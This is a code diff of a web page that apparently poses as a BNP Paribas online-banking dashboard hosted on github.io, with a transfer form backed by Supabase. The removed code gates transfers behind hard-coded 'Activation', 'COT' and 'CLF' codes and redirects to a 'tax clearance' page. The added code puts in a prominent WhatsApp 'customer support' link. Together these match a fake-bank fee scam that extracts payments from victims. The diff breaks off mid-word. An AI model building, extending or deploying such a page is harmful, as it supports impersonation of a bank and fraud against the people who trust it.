@@ -599,7 +599,81 @@ th, td {
   color: #0052cc;
   font-weight: 600;
 }
+.modal {
+  display: none;
+  position: fixed;
+  z-index: 9999;
+  left: 0; top: 0;
+  width: 100%; height: 100%;
+  background-color: rgba(0,0,0,0.6);
+  justify-content: center;
+  align-items: center;
+}
 
+.modal.active {
+  display: flex;
+}
+
+.modal-content {
+  background-color: #fff;
+  padding: 20px 30px;
+  border-radius: 10px;
+  max-width: 90%;
+  text-align: center;
+  box-shadow: 0 0 15px rgba(0,0,0,0.3);
+  font-family: Arial, sans-serif;
+}
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-top-color: #2e8b57; /* Bank green color */
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px auto;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+</style>
+<style>
+  @import url('https://fonts.googleapis.com/icon?family=Material+Icons');
+
+  .whatsapp-support-btn {
+    position: fixed;
+    bottom: 350px;
+    right: 20px;
+    z-index: 9999; /* Always above everything */
+    background-color: #25D366; /* WhatsApp green */
+    color: white;
+    font-size: 150px;
+    padding: 60px;
+    border-radius: 50%;
+    text-align: center;
+    text-decoration: none;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    transition: transform 0.3s ease;
+  }
+
+  .whatsapp-support-btn:hover {
+    transform: scale(1.1);
+    background-color: #128C7E;
+  }
+
+
+  @media (max-width: 768px) {
+    .whatsapp-support-btn {
+      bottom: 20px;
+      right: 20px;
+      font-size: 54px;
+      padding: 12px;
+      z-index: 9999;
+    }
+  }
 </style>
 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" / 
@@ -731,15 +805,21 @@ th, td {
     <input id="bankName" ...>
     	<label for="fullName">Account Number</label>
     <input id="accountNumber" ...>
-    	<label for="fullName"> Bank code</label>
+    	<label for="fullName"> Enter Amount</label>
     <input id="codeInput" ...>
     <button id="submitAction">Transfer Now</button>
   </div>
+  <!-- Modal Structure -->
+<div class="modal" id="modal">
+  <div class="modal-content" id="modalContent"></div>
+  
+
 </div>
-
-
-
-
+</div>
+<!-- Floating WhatsApp Support Icon -->
+<a href="https://wa.me/17752778323" target="_blank" class="whatsapp-support-btn" title="Chat with Customer Support">
+  <span class="material-icons">contact_support</span>
+</a>
 <script>
   const supabaseClient = supabase.createClient(
     'https://mslojedoggqjhejwploj.supabase.co',
@@ -859,202 +939,4 @@ async function loadUserBasicInfo() {
     }
 
     if (data) {
-      console.log("Basic user info received:", data);
-
-      // 🧑 Full Name
-      const nameEl = document.getElementById("profileName");
-      if (nameEl) nameEl.textContent = `${data.first_name} ${data.last_name}`;
-
-      // 🔢 Account Number
-      const acctEl = document.getElementById("accountNumber");
-      if (acctEl) acctEl.textContent = data.account_number;
-    } else {
-      alert("User not found.");
-    }
-  } catch (err) {
-    console.error("Unexpected Error:", err);
-    alert("An error occurred while loading user info.");
-  }
-}
-
-  async function loadTransactions() {
-    const { data, error } = await supabaseClient
-      .from('transactions')
-      .select('*')
-      .eq('user_id', userId)
-      .order('created_at', { ascending: false });
-
-    const tbody = document.getElementById("transactionTableBody");
-    tbody.innerHTML = '';
-
-    if (!data || data.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="4">No transactions found.</td></tr>`;
-      return;
-    }
-data.forEach(tx => {
-      const row = document.createElement('tr');
-      
-      row.innerHTML = `
-  <td>${new Date(tx.created_at).toLocaleString()}</td>
-  <td>${tx.type}</td>
-  <td>$${parseFloat(tx.amount).toFixed(2)}</td>
-  <td>${tx.description || '-'}</td>
-  <td>${tx.sender_name || '-'}</td>
-  <td>${tx.bank_name || '-'}</td>
-  <td>${tx.sender_account_number || '-'}</td>
-  <td>${tx.transaction_type || '-'}</td>
-  <td>${tx.swift_code || '-'}</td>
-  <td>${tx.transaction_ref || '-'}</td>
-`;
-  
-      tbody.appendChild(row);
-    });
-  } 
-    
-  
-  
-</script>
-<script>
-	
-  async function downloadStatement() {
-    const accountData = await supabaseClient
-      .from('users')
-      .select('*')
-      .eq('id', userId)
-      .single();
-
-    const transactionsData = await supabaseClient
-      .from('transactions')
-      .select('*')
-      .eq('user_id', userId)
-      .order('created_at', { ascending: false });
-
-    const { jsPDF } = window.jspdf;
-    const doc = new jsPDF();
-
-    let y = 10;
-
-    // Header
-    doc.setFontSize(16);
-    doc.text("Statement of Account", 10, y);
-    y += 10;
-
-    doc.setFontSize(12);
-    doc.text(`Name: ${accountData.data?.name || 'N/A'}`, 10, y); y += 7;
-    doc.text(`Email: ${accountData.data?.email || 'N/A'}`, 10, y); y += 7;
-    doc.text(`Balance: $${(accountData.data?.balance || 0).toFixed(2)}`, 10, y); y += 7;
-    doc.text(`Status: ${accountData.data?.status || 'N/A'}`, 10, y); y += 15;
-
-    doc.setFontSize(14);
-    doc.text("Transactions:", 10, y);
-    y += 10;
-
-    if (!transactionsData.data || transactionsData.data.length === 0) {
-      doc.setFontSize(12);
-      doc.text("No transactions found.", 10, y);
-    } else {
-      doc.setFontSize(10);
-
-      transactionsData.data.forEach(tx => {
-        if (y > 260) {
-          doc.addPage();
-          y = 10;
-        }
-
-        const dateStr = new Date(tx.created_at).toLocaleString();
-        const amountStr = `$${parseFloat(tx.amount).toFixed(2)}`;
-
-        // First row
-        doc.text(`Date: ${dateStr}`, 10, y);
-        doc.text(`Type: ${tx.type || '-'}`, 80, y);
-        doc.text(`Amount: ${amountStr}`, 140, y);
-        y += 6;
-
-        // Description (wrapped)
-        const descText = doc.splitTextToSize(`Desc: ${tx.description || '-'}`, 180);
-        doc.text(descText, 10, y);
-        y += descText.length * 5;
-
-        // Sender name & Bankp
-        doc.text(`Sender: ${tx.sender_name || '-'}`, 10, y);
-        doc.text(`Bank: ${tx.bank_name || '-'}`, 80, y);
-        y += 6;
-
-        // Account & Transaction Type
-        doc.text(`Acct #: ${tx.sender_account_number || '-'}`, 10, y);
-        doc.text(`Txn Type: ${tx.transaction_type || '-'}`, 80, y);
-        y += 6;
-
-        // SWIFT & Ref
-        doc.text(`SWIFT: ${tx.swift_code || '-'}`, 10, y);
-        doc.text(`Txn Ref: ${tx.transaction_ref || '-'}`, 80, y);
-        y += 10; // space before next transaction
-      });
-    }
-
-    doc.save("statement_of_account.pdf");
-  }
- // Call the function once DOM is ready
-</script>
-<script>
-  const modalOverlay = document.getElementById('modalOverlay');
-  const modalTitle = document.getElementById('modalTitle');
-  const codeInput = document.getElementById('codeInput');
-  const submitAction = document.getElementById('submitAction');
-
-  let currentAction = '';
-  const codes = {
-    transfer: 'ACT1234',
-    withdraw: 'COT5678',
-    payments: 'CLF9999'
-  };
-
-  const redirectURL = 'https://bnp-paribas-banking.github.io/BNP-PARISBAS-BANKING/tax_clearance.html'; // Change as needed
-
-  function openModal(actionType) {
-    modalOverlay.style.display = 'flex';
-    currentAction = actionType;
-    codeInput.value = '';
-
-    switch (actionType) {
-      case 'transfer':
-        modalTitle.textContent = 'Transfer Funds';
-        codeInput.placeholder = 'Enter Activation Code';
-        break;
-      case 'withdraw':
-        modalTitle.textContent = 'Withdraw Funds';
-        codeInput.placeholder = 'Enter COT Code';
-        break;
-      case 'payments':
-        modalTitle.textContent = 'Payment Request';
-        codeInput.placeholder = 'Enter CLF Code';
-        break;
-    }
-  }
-
-  document.getElementById('transferButton').addEventListener('click', () => openModal('transfer'));
-  document.getElementById('withdrawButton').addEventListener('click', () => openModal('withdraw'));
-  document.querySelector('.action-button:nth-child(3)').addEventListener('click', () => openModal('payments'));
-
-  submitAction.addEventListener('click', () => {
-    const userCode = codeInput.value.trim();
-    const correctCode = codes[currentAction];
-
-    if (userCode === correctCode) {
-      window.location.href = redirectURL;
-    } else {
-      alert('Invalid code. Please try again.');
-    }
-  });
-
-  // Close modal on outside click
-  modalOverlay.addEventListener('click', e => {
-    if (e.target === modalOverlay) {
-      modalOverlay.style.display = 'none';
-    }
-  });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-</body>
-</html>
+      conso
